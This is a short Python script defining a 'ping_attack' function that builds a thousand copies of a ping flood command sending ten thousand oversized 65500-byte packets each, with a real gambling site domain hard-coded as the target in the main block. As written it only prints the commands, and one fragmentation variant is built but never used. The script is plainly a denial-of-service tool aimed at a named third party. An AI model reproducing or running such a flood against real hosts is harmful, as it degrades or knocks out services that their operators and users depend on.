#!/usr/bin/env python3


def ping_attack(target, hit_times=1000, hit_times2=10000):

    commands_seq = []
    command_out_framentation = f"ping -c {hit_times2} -s 1460 -F {target}\r\n".encode()
    command = f"ping -c {hit_times2} -s 65500 {target}\r\n".encode()

    for i in range(1,hit_times+1):
        #print(i)
        commands_seq.append(command)

    return commands_seq



if __name__ == "__main__":

    commands_seq = ping_attack("caliente.mx")

    for command in commands_seq:
        print(command)
